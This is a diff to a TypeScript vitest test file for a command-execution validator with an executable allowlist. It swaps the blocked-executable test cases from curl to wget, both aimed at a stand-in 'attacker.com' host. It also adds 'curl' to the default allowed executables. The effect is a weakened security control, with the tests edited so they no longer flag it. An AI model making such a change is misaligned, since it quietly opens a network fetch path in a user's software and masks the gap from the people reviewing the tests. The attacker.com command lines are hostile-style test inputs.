@@ -23,11 +23,11 @@ vi.mock('child_process');
 vi.mock('fs');
 
 describe('validateCommand - Executable Allowlist Enforcement', () => {
-  it('should throw on blocked executable: curl', () => {
+  it('should throw on blocked executable: wget', () => {
     const validateCommand = createValidateCommandFn();
 
     expect(() => {
-      validateCommand(['curl', 'https://attacker.com'], []);
+      validateCommand(['wget', 'https://attacker.com'], []);
     }).toThrow(/not in allowed executables/i);
   });
 
@@ -545,7 +545,7 @@ describe('runCommand - Full Integration', () => {
 
     await expect(async () => {
       await runCommand({
-        command: ['curl', 'https://attacker.com'],
+        command: ['wget', 'https://attacker.com'],
         background: false,
         timeout: 5000,
         outputLines: 100,
@@ -843,7 +843,7 @@ function createRunCommandWithProfileFn(deps?: {
  */
 function createValidateCommandFn() {
   const DEFAULT_ALLOWED_EXECUTABLES = [
-    'pnpm', 'npx', 'node', 'tsx', 'playwright', 'prisma', 'drizzle-kit', 'vitest'
+    'pnpm', 'npx', 'node', 'tsx', 'playwright', 'prisma', 'drizzle-kit', 'vitest', 'curl'
   ];
   const BLOCKED_ARGS = ['-e', '--eval', '-c', '--print', '-p'];
 
